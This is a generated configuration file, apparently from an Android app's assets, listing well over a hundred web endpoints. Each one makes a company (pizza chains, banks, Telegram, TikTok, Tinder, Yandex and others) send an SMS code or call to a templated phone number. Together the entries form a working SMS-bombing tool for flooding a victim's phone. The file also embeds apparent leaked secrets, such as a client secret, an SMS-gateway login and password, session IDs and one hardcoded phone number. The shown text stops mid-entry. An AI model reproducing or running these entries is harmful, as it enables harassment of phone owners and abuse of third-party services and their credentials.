// Filtered services from ../app/src/main/assets/services.bsl
// Total: 501
// Generated: 2026-03-30T21:29:12.522269

SERVICE pizzahut:PizzaHut:INT
URL https://pizzahut.ru/account/password-reset
METHOD POST
CONTENT_TYPE form
DATA reset_by=phone
DATA action_id=pass-recovery
DATA phone=+{country_code}{phone}
END

SERVICE qiwi:Qiwi:INT
URL https://mobile-api.qiwi.com/oauth/authorize
METHOD POST
CONTENT_TYPE form
DATA response_type=urn:qiwi:oauth:response-type:confirmation-id
DATA username=+{country_code}{phone}
DATA client_id=android-qw
DATA client_secret=zAm4FKq9UnSe7id
END

SERVICE oyorooms:Oyorooms:INT
URL https://www.oyorooms.com/api/pwa/generateotp?phone=+{country_code}{phone}&country_code=%2B{country_code}&nod=4&locale=en
METHOD GET
CONTENT_TYPE params
END

SERVICE imgur:Imgur:INT
URL https://api.imgur.com/account/v1/phones/verify
METHOD POST
CONTENT_TYPE form
DATA phone_number={phone}
DATA region_code={country_code}
END

SERVICE grab:Grab:INT
URL https://p.grabtaxi.com/api/passenger/v2/profiles/register
METHOD POST
CONTENT_TYPE form
DATA phoneNumber=+{country_code}{phone}
DATA countryCode=ID
DATA name=test
END

SERVICE alpari:Alpari:INT
URL https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Referer: https://alpari.com/en/registration/
BODY {"mobile_phone":"+{country_code}{phone}","email":"test@test.com","client_type":"personal","deliveryOption":"sms"}
END

SERVICE twitch:Twitch:INT
URL https://passport.twitch.tv/register?trusted_request=true
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"birthday":{"day":17,"month":10,"year":1998},"client_id":"qb1unb4b2q4t58fwldcbz2nnm46a8zp","include_verification_code":true,"password":"test123","phone_number":"+{country_code}{phone}","username":"testuser"}
END

SERVICE tiktok:TikTok:INT
URL https://m.tiktok.com/node/send/download_link
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Mobile":"{phone}","PhoneRegin":"{country_code}","language":"en","slideVerify":0}
END

SERVICE totopizza:Totopizza:INT
URL https://api.totopizza.ru/graphql
METHOD POST
CONTENT_TYPE json
BODY {"operationName": "requestPhoneCodeAuth", "query": "\\n  mutation requestPhoneCodeAuth($telephone:String!) {\\n    requestPhoneCodeAuth(telephone:$telephone)\\n  }\\n", "variables": {"telephone": "{phone}"}}
END

SERVICE beerlogapizza:Beerlogapizza:INT
URL https://smsc.ru/sys/send.php
METHOD POST
CONTENT_TYPE form
DATA login=beerlogaa@gmail.com
DATA psw=QWE780p
DATA phones=+{country_code}{phone}
DATA mes=code
DATA call=1
DATA fmt=3
END

SERVICE tashirpizza:Tashirpizza:INT
URL https://tashirpizza.ru/ajax/mindbox_register
METHOD POST
CONTENT_TYPE form
DATA phone=+{country_code}{phone}
DATA fio=Олег Олегов Олегович
DATA bd=
END

SERVICE mospizza:MosPizza:INT
URL https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php
METHOD POST
CONTENT_TYPE form
DATA phone=+{country_code}{phone}
DATA name=Олег
END

SERVICE pizzakazan:PizzaKazan:INT
URL https://pizzakazan.com/auth/ajax.php
METHOD POST
CONTENT_TYPE form
DATA phone=+{country_code}{phone}
DATA method=sendCode
END

SERVICE pizzasinizza:PizzaSinizza:INT
URL https://pizzasinizza.ru/api/phoneCode.php
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+{country_code}{phone}"}
END

SERVICE dodopizzaby_by:Dodopizzaby By:INT
URL https://dodopizza.by/api/sendconfirmationcode
METHOD POST
CONTENT_TYPE form
DATA phoneNumber=+{country_code}{phone}
END

SERVICE expresspizzaby_by:Expresspizzaby By:INT
URL https://express-pizza.by/checkout.php?call=1
METHOD POST
CONTENT_TYPE form
DATA tel=+{country_code}{phone}
END

SERVICE iq_pizza:IQPizza:INT
URL https://iq-pizza.eatery.club/site/v1/pre-login
METHOD POST
CONTENT_TYPE json
HEADER Locale: uk
BODY {"phone":"{country_code}{phone}"}
END

SERVICE gazprombank:GazPromBank:7
URL https://mob.gazprombank.ru/api/v2/sms/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}", "purpose": "registration"}
END

SERVICE yamiyami:YamiYami:7
URL https://api.new.yamiyami.ru/auth/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER api-agent: yamiyami
BODY {"phone": "+7{phone}"}
END

SERVICE eccoru:EccoRU:7
URL https://ecco.ru/ajax/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA ajax_event=set_auth_type
DATA auth_type=phone
DATA phone_login=+7{phone}
END

SERVICE onlinedoctor:OnlineDoctor:7
URL https://onlinedoctor.ru/mobile/send_sms_code/
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA phone=+7{phone}
END

SERVICE valtaru:ValtaRU:7
URL https://valta.ru/bitrix/services/main/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
HEADER bx-ajax: true
DATA phone=+7{phone}
END

SERVICE erckru:ErckRU:7
URL https://erck.ru/ajax/sms_code.php
METHOD GET
CONTENT_TYPE params
HEADER Accept: */*
PARAM action=send
PARAM phone=+7{phone}
PARAM registration=1
PARAM hh=5b4ca24d86513c145286b68f47848447
END

SERVICE rentalclub:RentalClub:7
URL https://api.rental-club.ru/v2/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName": "SendConfirmationCode", "variables": {"phone": "+7{phone}"}, "query": "mutation SendConfirmationCode($phone: String!) { authSendConfirmationCode(phone: $phone) { ok } }"}
END

SERVICE winelab:Winelab:7
URL https://www.winelab.ru/confirmation/sendByPhone
METHOD GET
CONTENT_TYPE params
PARAM number={phone_formatted}
END

SERVICE sunlight:Sunlight:7
URL https://api.sunlight.net/v3/customers/authorization/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}", "flashcall": true}
END

SERVICE madyart:Madyart:7
URL https://madyart.ru/local/aut.php
METHOD POST
CONTENT_TYPE form
DATA wct_reg_phone=+7{phone}
END

SERVICE evraz:EvrazMarket:7
URL https://spb.evraz.market/bitrix/services/main/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA userPhone=+7{phone}
END

SERVICE uteka:Uteka:7
URL https://spb.uteka.ru/rpc/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode", "params": {"phone": "{phone}"}}
END

SERVICE elementaree:Elementaree:7
URL https://api-new.elementaree.ru/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"query": "mutation{sendSmsCode(phone:\\"+7{phone}\\"){ok}}"}
END

SERVICE adengi:ADengi:7
URL https://adengi.ru/rest/v1/registration/code/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

SERVICE shoppinglive:ShoppingLive:7
URL https://www.shoppinglive.ru/phone-verification/send-code
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE icq:ICQ:7
URL https://u.icq.net/api/v89/rapi/auth/sendCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"msisdn": "+7{phone}"}
END

SERVICE vprok:Vprok (Perekrestok):7
URL https://www.vprok.ru/as_send_pin
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE aliexpress:AliExpress Russia:7
URL https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

SERVICE fonbet:Fonbet:7
URL https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

SERVICE apteka_ru:Aptekaru:7
URL https://api.apteka.ru/Auth/Auth_Code?cityUrl=moskva
METHOD POST
CONTENT_TYPE json
HEADER Accept: */*
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
HEADER Access-Control-Request-Headers: authorization,content-type
HEADER Access-Control-Request-Method: POST
HEADER Connection: keep-alive
HEADER Host: api.apteka.ru
HEADER Origin: https://apteka.ru
HEADER Referer: https://apteka.ru/
HEADER Sec-Fetch-Dest: empty
HEADER Sec-Fetch-Mode: cors
HEADER Sec-Fetch-Site: same-site
BODY {"phone": "+7{phone}", "u": "U"}
END

SERVICE magnit:Magnit:7
URL https://new.moy.magnit.ru/local/ajax/login/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA ksid=ee191257-a4fe-4e39-9f0f-079c7f721eee_0
END

SERVICE telegram:Telegram:7
URL https://my.telegram.org/auth/send_password
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE mt_free:Mt Free:7
URL https://cabinet.wi-fi.ru/api/auth/by-sms
METHOD POST
CONTENT_TYPE form
HEADER Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
HEADER App-ID: cabinet
HEADER Cache-Control: no-cache
HEADER Connection: keep-alive
DATA msisdn=+7{phone}
DATA g-recaptcha-response=
END

SERVICE sberuslugi:Sberuslugi:7
URL https://sberuslugi.ru/api/v1/user/secret
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE ok_ru:Okru:7
URL https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone
METHOD POST
CONTENT_TYPE form
DATA st.r.phone=+7{phone}
END

SERVICE my_shop:My-Shop:7
URL https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=d51a4d42-c5e8-43ce-a24d-383a3b29f17ae821ed918
METHOD POST
CONTENT_TYPE json
BODY {"phone_code": "7", "phone": "{phone}"}
END

SERVICE citystarwear:Citystarwear:7
URL https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php
METHOD POST
CONTENT_TYPE form
DATA hdlr=bsAuthSendCode
DATA key=DOvBhIav34535434v212SEoVINS
DATA phone={phone}
DATA pcode=7
DATA vphone={phone}
END

SERVICE tinkoff:Tinkoff:7
URL https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE vesnashop:Vesnashop:7
URL https://vesna.shop/bitrix/components/splash/auth/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Accept: application/json, text/javascript, */*; q=0.01
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru,en;q=0.9
HEADER Content-Type: application/x-www-form-urlencoded; charset=UTF-8
HEADER referer: https://vesna.shop/
HEADER x-requested-with: XMLHttpRequest
DATA type=auth
DATA phone=+7{phone}
DATA vtr=
END

SERVICE sipnetru:Sipnetru:7
URL https://register2.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone={phone}
METHOD POST
CONTENT_TYPE json
END

SERVICE bandeatosru:Bandeatosru:7
URL https://bandeatos.ru/?MODE=AJAX
METHOD POST
CONTENT_TYPE form
DATA sessid=475674332f23ec4b8c70a1394acd7a6e
DATA FORM_ID=bx_1789522556_form
DATA PHONE_NUMBER=+7{phone}
END

SERVICE moneyman:Moneyman:7
URL https://msk.taxovichkof.ru/api/userSendSms
METHOD POST
CONTENT_TYPE json
BODY {"username": "+7 (950) 213-5308", "lang": "ru", "city": "msk"}
END

SERVICE qugo:Qugo:7
URL https://api.qugo.ru/client/send-code
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

SERVICE evelux:Evelux:7
URL https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE vladimir:Vladimir:7
URL https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE dostavka:Dostavka:7
URL https://dostavka.dixy.ru/ajax/mp-auth-test.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE tb:Tb:7
URL https://tb.tips4you.ru/auth/ajax/signup_action
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE vodnik:Vodnik:7
URL https://vodnik.ru/signin/sms-request
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

SERVICE clientsapi01w:Clientsapi01W:7
URL https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

SERVICE semena_partner:Semena-Partner:7
URL https://semena-partner.ru/ajax/getPhoneCodeReg.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE BeelineTV:BeelineTV:7
URL https://rest.beeline.tv/api_z3/service/OTTUser/action/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER X-Request-ID: {uuid}
BODY {"password": "{password}", "userName": "+7{phone}", "extraParams": {"loginType": {"objectType": "KalturaStringValue", "value": "singleLogin"}, "deviceDetails": {"value": "{\"family\":\"ios\",\"manufacturer\":\"Apple\",\"model\":\"iPhone 14\",\"form\":\"iPhone\",\"osversion\":\"iOS 16.1\"}", "objectType": "KalturaStringValue"}, "brandID": {"objectType": "KalturaStringValue", "value": "1"}}, "apiVersion": "5.4", "udid": "{uuid}", "partnerId": "478"}
END

SERVICE BolshoeTV:BolshoeTV:7
URL https://api.bolshoe.tv/v1/agregator/sendAuth
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
BODY {"auth_type":"phone","uid":"+7{phone}"}
END

SERVICE SberID_Auth:SberID Auth:7
URL https://id.sber.ru/CSAFront/oidc/sberbank_id/authorize.do
METHOD GET
CONTENT_TYPE params
HEADER Content-Type: application/x-www-form-urlencoded
PARAM redirect_uri=dgis://sidauth
PARAM scope=openid name mobile email email_confirmed
PARAM login_hint={phone}
PARAM client_id=0b9c9046-4512-41ea-ba2d-9057fac4ee52
PARAM response_type=code
PARAM authApp=SBOLWebAuthApp
PARAM app_redirect_uri=
PARAM state={random_state}
PARAM nonce={uuid}
PARAM logUid={hash:0:32}
PARAM channel=iOSMobile
PARAM personalizaton=false
END

SERVICE SberID_AB:SberID AB:7
URL https://id.sber.ru/api/ab
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"platform":"web"}
END

SERVICE ParkingSPB:Parking SPB:7
URL https://parking.spb.ru/api/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER X-APOLLO-OPERATION-NAME: verificationCodeRequest
BODY {"operationName": "verificationCodeRequest", "variables": {"params": {"action": "SIGN_IN", "subject": "{phone}", "subjectType": "PHONE"}}, "query": "mutation verificationCodeRequest($params: VerificationCodeInput!) { verificationCodeRequest(params: $params) { delay success __typename } }"}
END

SERVICE CityDrive:CityDrive:7
URL https://api.citydrive.ru/signup?version=21
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
BODY {"os": "web", "phone": "{phone}", "phone_code": "7", "vendor_id": "{uuid}"}
END

SERVICE rabota:Rabota:7
URL https://www.rabota.ru/remind
METHOD POST
CONTENT_TYPE form
DATA credential=+7{phone}
END

SERVICE rutube:Rutube:7
URL https://rutube.ru/api/accounts/sendpass/phone
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE alfalife:Alfalife:7
URL https://alfalife.cc/auth.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE edostavka:Edostavka:7
URL https://vladimir.edostav.ru/site/CheckAuthLogin
METHOD POST
CONTENT_TYPE form
DATA phone_or_email=+7{phone}
END

SERVICE etm:Etm:7
URL https://www.etm.ru/cat/runprog.html
METHOD POST
CONTENT_TYPE form
DATA m_phone=+7{phone}
DATA mode=sendSms
END

SERVICE finam:Finam:7
URL https://www.finam.ru/api/smslocker/sendcode
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE fixprice:FixPrice:7
URL https://fix-price.ru/ajax/register_phone_code.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA action=getCode
END

SERVICE foodband:Foodband:7
URL https://foodband.ru/api?phone=+7{phone}&call=customers/sendVerificationCode&g-recaptcha-response=
METHOD GET
CONTENT_TYPE params
END

SERVICE friendsclub:FriendsClub:7
URL https://friendsclub.ru/assets/components/pl/connector.php
METHOD POST
CONTENT_TYPE form
DATA MobilePhone=+7{phone}
DATA casePar=authSendsms
END

SERVICE hatimaki:Hatimaki:7
URL https://www.hatimaki.ru/register/
METHOD POST
CONTENT_TYPE form
DATA REGISTER[LOGIN]=+7{phone}
DATA REGISTER[PERSONAL_PHONE]=+7{phone}
DATA REGISTER[EMAIL]=test@test.com
END

SERVICE indriver:InDriver:7
URL https://terra-1.indriverapp.com/api/authorization?locale=ru
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA mode=request
END

SERVICE yandex_informatics:YandexInformatics:7
URL https://informatics.yandex/api/v1/registration/confirmation/phone/send/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA country=RU
END

SERVICE invitro:Invitro:7
URL https://lk.invitro.ru/sp/mobileApi/createUserByPassword
METHOD POST
CONTENT_TYPE form
DATA login=+7{phone}
DATA password=test123
DATA application=lkp
END

SERVICE koronapay:KoronaPay:7
URL https://koronapay.com/transfers/online/api/users/otps
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE logistictech:LogisticTech:7
URL https://api-rest.logistictech.ru/api/v1.1/clients/request-code
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
HEADER Restaurant-chain: c0ab3d88-fba8-47aa-b08d-c7598a3be0b9
END

SERVICE makarolls:Makarolls:7
URL https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php
METHOD POST
CONTENT_TYPE form
DATA data=+7{phone}
DATA metod=postreg
END

SERVICE menzacafe:MenzaCafe:7
URL https://menza-cafe.ru/system/call_me.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA fio=Олег
END

SERVICE mistercash:MisterCash:7
URL https://my.mistercash.ua/ru/send/sms/registration?number=+7{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE modulbank:ModulBank:7
URL https://my.modulbank.ru/api/v2/registration/nameAndPhone
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"CellPhone":"+7{phone}","FirstName":"Олег","Package":"optimal"}
END

SERVICE mtstv:MTSTV:7
URL https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn=+7{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE multiplex:Multiplex:7
URL https://auth.multiplex.ua/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"login":"+7{phone}"}
END

SERVICE mygames:MyGames:7
URL https://account.my.games/signup_send_sms/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE niyama:Niyama:7
URL https://www.niyama.ru/ajax/sendSMS.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE nl_ua:NLUA:7
URL https://www.nl.ua
METHOD POST
CONTENT_TYPE form
DATA phone=7{phone}
DATA method=sendCode
DATA registration=N
END

SERVICE nncard:NnCard:7
URL https://nn-card.ru/api/1.0/covid/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE pirogino:Pirogino:7
URL https://piroginomerodin.ru/index.php?route=sms/login/sendreg
METHOD POST
CONTENT_TYPE form
DATA telephone=+7{phone}
END

SERVICE prosushi:ProSushi:7
URL https://www.prosushi.ru/php/profile.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA mode=sms
END

SERVICE qlean:Qlean:7
URL https://sso.cloud.qlean.ru/http/users/requestotp?phone=+7{phone}&clientId=undefined&sessionId=4224
METHOD GET
CONTENT_TYPE params
HEADER Referer: https://qlean.ru/sso?redirectUrl=https://qlean.ru/
END

SERVICE raiffeisen:Raiffeisen:7
URL https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number=+7{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE richfamily:RichFamily:7
URL https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE rutaxi:RutaTaxi:7
URL https://rutaxi.ru/ajax_keycode.html
METHOD POST
CONTENT_TYPE form
DATA 1=+7{phone}
END

SERVICE sayoris:Sayoris:7
URL https://sayoris.ru/?route=parse/whats
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE shopandshow:ShopAndShow:7
URL https://shopandshow.ru/sms/password-request/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA resend=0
END

SERVICE smartspace:SmartSpace:7
URL https://smart.space/api/users/request_confirmation_code/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile":"+7{phone}","action":"confirm_mobile"}
END

SERVICE sms4b:SMS4B:7
URL https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php
METHOD POST
CONTENT_TYPE form
DATA demo_number=+7{phone}
DATA ajax_demo_send=1
END

SERVICE suandshi:SuAndShi:7
URL https://suandshi.ru/mobile_api/register_mobile_user?phone=+7{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE sushifuji:SushiFuji:7
URL https://sushifuji.ru/sms_send_ajax.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA name=false
END

SERVICE sushimaster:SushiMaster:7
URL https://client-api.sushi-master.ru/api/v1/auth/init
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE sushiprofi:SushiProfi:7
URL https://www.sushi-profi.ru/api/order/order-call/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","name":"Олег"}
END

SERVICE tabasko:Tabasko:7
URL https://tabasko.su/
METHOD POST
CONTENT_TYPE form
DATA LOGIN=+7{phone}
DATA ACTION=GET_CODE
END

SERVICE tabris:Tabris:7
URL https://lk.tabris.ru/reg/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA action=phone
END

SERVICE tarantinofamily:TarantinoFamily:7
URL https://www.tarantino-family.com/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA action=callback_phonenumber
END

SERVICE taxiritm:TaxiRitm:7
URL https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/
METHOD POST
CONTENT_TYPE form
DATA BACK_CALL_PHONE=+7{phone}
DATA RECALL=Y
END

SERVICE tele2:Tele2:7
URL https://msk.tele2.ru/api/validation/number/+7{phone}
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"sender":"Tele2"}
END

SERVICE thehive:TheHive:7
URL https://thehive.pro/auth/signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE tvoyaapteka:TvoyaApteka:7
URL https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1
METHOD POST
CONTENT_TYPE form
DATA tel=+7{phone}
DATA change_code=1
END

SERVICE uchi_ru:UchiRu:7
URL https://app.doma.uchi.ru/api/v1/parent/signup_start
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","first_name":"-","utm_data":{},"via":"call"}
END

SERVICE utair:Utair:7
URL https://b.utair.ru/api/v1/login/
METHOD POST
CONTENT_TYPE form
DATA login=+7{phone}
END

SERVICE vezitaxi:VeziTaxi:7
URL https://vezitaxi.com/api/employment/getsmscode?phone=+7{phone}&city=561&callback=jsonp_callback_35979
METHOD GET
CONTENT_TYPE params
END

SERVICE visapay:VisaPay:7
URL https://pay.visa.ru/api/Auth/code/request
METHOD POST
CONTENT_TYPE form
DATA phoneNumber=+7{phone}
END

SERVICE vsk:VSK:7
URL https://shop.vsk.ru/ajax/auth/postSms/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE iconjob:IconJob:7
URL https://api.iconjob.co/api/auth/verification_code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE wowworks:WowWorks:7
URL https://api.wowworks.ru/v2/site/send-code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","type":2}
END

SERVICE cleversite:CleverSite:7
URL https://clients.cleversite.ru/callback/run.php
METHOD POST
CONTENT_TYPE form
DATA num=+7{phone}
DATA siteid=62731
END

SERVICE cloudloyalty:CloudLoyalty:7
URL https://app.cloudloyalty.ru/demo/send-code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"country":2,"phone":"7{phone}","roistatVisit":47637}
END

SERVICE mtstv_api:MTSTVAPI:7
URL https://api.mtstv.ru/v1/users
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"msisdn":"+7{phone}"}
END

SERVICE cian:Cian:7
URL https://api.cian.ru/sms/v1/send-validation-code/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","type":"authenticateCode"}
END

SERVICE ennergiia:Ennergiia:7
URL https://api.ennergiia.com/auth/api/development/lor
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"referrer":"ennergiia","via_sms":true,"phone":"+7{phone}"}
END

SERVICE sbis:Sbis:7
URL https://online.sbis.ru/reg/service/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"firstName":"Олег","middleName":"Олег","lastName":"Олег","sex":"1","birthDate":"7.9.1997","mobilePhone":"+7{phone}","russianFederationResident":"true","isDSA":"false","personalDataProcessingAgreement":"true","bKIRequestAgreement":"null","promotionAgreement":"true"}
END

SERVICE rutaxi_msk:RutaxiMsk:7
URL https://moscow.rutaxi.ru/ajax_keycode.html
METHOD POST
CONTENT_TYPE form
DATA 1=+7{phone}
END

SERVICE youla:Youla:7
URL https://youla.ru/web-api/auth/request_code
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE smsint:SMSInt:7
URL https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php
METHOD POST
CONTENT_TYPE form
DATA name=Олег
DATA phone=+7{phone}
END

SERVICE invitro_lk:InvitroLK:7
URL https://lk.invitro.ru/lk2/lka/patient/refreshCode
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE karusel:Karusel:7
URL https://app.karusel.ru/api/v1/phone/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE kfc:KFC:7
URL https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE icq_json:ICQJSON:7
URL https://www.icq.com/smsreg/requestPhoneValidation.php
METHOD POST
CONTENT_TYPE form
DATA msisdn=+7{phone}
DATA locale=en
DATA countryCode=ru
END

SERVICE ube:Ube:7
URL https://ube.pmsm.org.ru/esb/iqos-phone/validate
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE ivi:Ivi:7
URL https://api.ivi.ru/mobileapi/user/register/phone/v6
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE cloudmail:CloudMail:7
URL https://cloud.mail.ru/api/v2/notify/applink
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","api":2,"email":"email","x-email":"x-email"}
END

SERVICE plink:Plink:7
URL https://plink.tech/register/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE gotinder:Gotinder:7
URL https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru
METHOD POST
CONTENT_TYPE form
DATA phone_number=+7{phone}
END

SERVICE anytime:Anytime:7
URL https://api-prime.anytime.global/api/v2/auth/sendVerificationCode
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE benzuber:Benzuber:7
URL https://app.benzuber.ru/login
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE yandex_eda:YandexEda:7
URL https://eda.yandex/api/v1/user/request_authentication_code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone_number":"+7{phone}"}
END

SERVICE yandex_chef:YandexChef:7
URL https://api.chef.yandex/api/v2/auth/sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE ozon:Ozon:7
